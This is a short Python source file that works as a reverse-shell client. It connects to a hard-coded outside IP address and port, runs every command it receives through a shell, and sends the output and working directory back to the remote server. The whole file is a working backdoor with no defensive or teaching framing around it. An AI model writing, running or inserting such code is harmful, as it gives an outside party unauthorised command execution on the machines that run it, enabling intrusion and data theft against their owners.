import socket
import os
import subprocess
import sys

s = socket.socket()

host = "188.166.150.98"  # Change this to the actual IP address of the server
port = 65000

print(f'Connecting to host | IP[{host}]')

try:
    s.connect((host, port))
except socket.error as msg:
    print(f"Connection error: {msg}")
    sys.exit()

while True:
    try:
        # Receiving data from the server
        data = s.recv(1024)
        if len(data) == 0:
            break  # Break if no data is received (server might have closed connection)

        # Handling 'cd' command
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except FileNotFoundError as e:
                s.send(str.encode(f"Directory not found: {e}\n"))
                continue
            except Exception as e:
                s.send(str.encode(f"Error changing directory: {e}\n"))
                continue

        # Execute the command
        if len(data) > 0:
            cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            # Optional: For debugging purposes
            print(output_str)
    except socket.error as msg:
        print(f"Socket error: {msg}")
        break
    except Exception as e:
        print(f"General error: {e}")
        break

# Close the connection cleanly
s.close()
